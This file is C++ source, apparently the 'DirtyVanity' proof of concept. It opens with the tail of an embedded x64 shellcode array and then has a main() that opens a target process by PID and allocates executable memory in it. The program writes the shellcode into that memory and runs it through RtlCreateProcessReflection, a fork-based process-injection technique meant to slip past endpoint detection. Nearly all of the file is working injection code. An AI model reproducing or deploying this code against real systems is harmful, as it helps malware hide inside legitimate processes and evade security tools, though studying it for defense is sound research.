  0x6C, 0x00, 0x6F, 0x00, 0x20, 0x00, 0x66, 0x00, 0x48, 0x89,
  0x85, 0xF8, 0x00, 0x00, 0x00, 0x48, 0xB8, 0x72, 0x00, 0x6F,
  0x00, 0x6D, 0x00, 0x20, 0x00, 0x48, 0x89, 0x85, 0x00, 0x01,
  0x00, 0x00, 0x48, 0xB8, 0x44, 0x00, 0x69, 0x00, 0x72, 0x00,
  0x74, 0x00, 0x48, 0x89, 0x85, 0x08, 0x01, 0x00, 0x00, 0x48,
  0xB8, 0x79, 0x00, 0x20, 0x00, 0x56, 0x00, 0x61, 0x00, 0x48,
  0x89, 0x85, 0x10, 0x01, 0x00, 0x00, 0x48, 0xB8, 0x6E, 0x00,
  0x69, 0x00, 0x74, 0x00, 0x79, 0x00, 0x48, 0x89, 0x85, 0x18,
  0x01, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x20, 0x01, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x95, 0xA0, 0x00, 0x00,
  0x00, 0x48, 0x8D, 0x8D, 0x28, 0x02, 0x00, 0x00, 0xFF, 0x95,
  0x10, 0x02, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x38, 0x02, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x50, 0x01,
  0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x48, 0x00, 0x00,
  0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00,
  0x00, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00,
  0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x48,
  0xC7, 0x44, 0x24, 0x28, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D,
  0x85, 0x28, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20,
  0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x95, 0x18,
  0x02, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x38, 0x02, 0x00, 0x00,
  0xFF, 0x95, 0x00, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x85, 0x40,
  0x02, 0x00, 0x00, 0x48, 0x8B, 0xF8, 0x33, 0xC0, 0xB9, 0x58,
  0x00, 0x00, 0x00, 0xF3, 0xAA, 0x48, 0xC7, 0x85, 0x40, 0x02,
  0x00, 0x00, 0x58, 0x00, 0x00, 0x00, 0xC7, 0x85, 0x48, 0x02,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB8, 0x08, 0x00, 0x00,
  0x00, 0x48, 0x6B, 0xC0, 0x01, 0x41, 0xB8, 0x20, 0x00, 0x00,
  0x00, 0xBA, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x4D, 0x00,
  0x48, 0x8B, 0x4C, 0x01, 0x28, 0xFF, 0x95, 0xF8, 0x01, 0x00,
  0x00, 0x48, 0x89, 0x85, 0xA0, 0x02, 0x00, 0x00, 0x48, 0x8B,
  0x85, 0xA0, 0x02, 0x00, 0x00, 0x48, 0xC7, 0x00, 0x28, 0x00,
  0x00, 0x00, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48, 0x6B, 0xC0,
  0x00, 0x48, 0x8B, 0x8D, 0xA0, 0x02, 0x00, 0x00, 0xC7, 0x44,
  0x01, 0x08, 0x05, 0x00, 0x02, 0x00, 0xB8, 0x20, 0x00, 0x00,
  0x00, 0x48, 0x6B, 0xC0, 0x00, 0x0F, 0xB7, 0x8D, 0x18, 0x02,
  0x00, 0x00, 0x48, 0x8B, 0x95, 0xA0, 0x02, 0x00, 0x00, 0x48,
  0x89, 0x4C, 0x02, 0x10, 0xB8, 0x20, 0x00, 0x00, 0x00, 0x48,
  0x6B, 0xC0, 0x00, 0x48, 0x8B, 0x8D, 0xA0, 0x02, 0x00, 0x00,
  0x48, 0x8B, 0x95, 0x20, 0x02, 0x00, 0x00, 0x48, 0x89, 0x54,
  0x01, 0x18, 0x48, 0xC7, 0x85, 0xB0, 0x02, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x48, 0x8B, 0x85, 0xA0, 0x02, 0x00, 0x00,
  0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x8D, 0x85, 0x40, 0x02,
  0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x8B, 0x85,
  0x38, 0x02, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x40, 0xC7,
  0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24,
  0x30, 0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x28,
  0x00, 0x00, 0x00, 0x00, 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00,
  0x00, 0x00, 0x00, 0x41, 0xB9, 0xFF, 0xFF, 0x1F, 0x00, 0x41,
  0xB8, 0xFF, 0xFF, 0x1F, 0x00, 0x48, 0x8D, 0x95, 0xB0, 0x02,
  0x00, 0x00, 0x48, 0x8D, 0x8D, 0xA8, 0x02, 0x00, 0x00, 0xFF,
  0x95, 0x08, 0x02, 0x00, 0x00, 0x89, 0x85, 0xB8, 0x02, 0x00,
  0x00, 0x48, 0xB8, 0x4E, 0x74, 0x53, 0x75, 0x73, 0x70, 0x65,
  0x6E, 0x48, 0x89, 0x45, 0x10, 0x48, 0xB8, 0x64, 0x54, 0x68,
  0x72, 0x65, 0x61, 0x64, 0x00, 0x48, 0x89, 0x45, 0x18, 0x48,
  0x8D, 0x55, 0x10, 0x48, 0x8B, 0x8D, 0xE8, 0x01, 0x00, 0x00,
  0xFF, 0x95, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x85, 0xC0,
  0x02, 0x00, 0x00, 0x33, 0xD2, 0x48, 0xC7, 0xC1, 0xFE, 0xFF,
  0xFF, 0xFF, 0xFF, 0x95, 0xC0, 0x02, 0x00, 0x00, 0x48, 0x8D,
  0xA5, 0x58, 0x03, 0x00, 0x00, 0x5F, 0x5D, 0xC3
};

int main(int argc, char** argv)
{

	DWORD victimPid;
	if (argc != 2)
	{
		std::cout << "[+] USAGE: DirtyVanity [TARGET_PID_TO_REFLECT]" << std::endl;
		return -1;
	}
	std::string pidArg = argv[1];
	try
	{
		victimPid = std::stoi(pidArg);
	}
	catch (std::invalid_argument const& ex)
	{
		std::cout << "[-] USAGE: Invalid PID choice " << pidArg << std::endl;
		return -1;
	}

	HANDLE victimHandle = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE, TRUE, victimPid);
	if (victimHandle == nullptr)
	{
		std::cout << std::format("[-] Error using OpenProcess on PID {}: ERROR {}", victimPid, GetLastError()) << std::endl;
		return -1;
	}
	std::cout << "[+] Got a handle to PID " << pidArg << " succesfuly" << std::endl;

	// allocate shellcode within victim
	DWORD_PTR shellcodeSize = sizeof(shellcode);

	LPVOID baseAddress = VirtualAllocEx(victimHandle, nullptr, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (baseAddress == nullptr)
	{
		std::cout << std::format("[-] Error allocating shellcode with VirtualAllocEx on PID {}: ERROR {}", victimPid, GetLastError()) << std::endl;
		return -1;
	}
	std::cout << std::format("[+] Allocated space for shellcode in start address: {}", baseAddress) << std::endl;

	//write shellcode
	size_t bytess = 0;

	bool status = WriteProcessMemory(victimHandle, baseAddress, shellcode, sizeof(shellcode), &bytess);
	if (!status)
	{
		std::cout << std::format("[-] Error writing shellcode with WriteProcessMemory on Explorer.exe : ERROR {}", GetLastError()) << std::endl;
		return -1;
	}
	std::cout << "[+] Succefuly wrote shellcode to victim. about to start the Mirroring" << std::endl;


	HMODULE lib = LoadLibraryA("ntdll.dll");
	if (!lib)
	{
		return -1;
	}

	RtlCreateProcessReflectionFunc RtlCreateProcessReflection = (RtlCreateProcessReflectionFunc)GetProcAddress(lib, "RtlCreateProcessReflection");
	if (!RtlCreateProcessReflection)
	{
		return -1;
	}

	T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = { 0 };
	NTSTATUS reflectRet = RtlCreateProcessReflection(victimHandle, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE, baseAddress, nullptr, NULL, &info);
	if (reflectRet == STATUS_SUCCESS) {
		std::cout << "[+] Succesfully Mirrored to new PID: " << (DWORD)info.ReflectionClientId.UniqueProcess << std::endl;
	}
	else {
		std::cout << "[!] Error Mirroring: ERROR " << GetLastError() << std::endl;
	}

	return reflectRet;
}
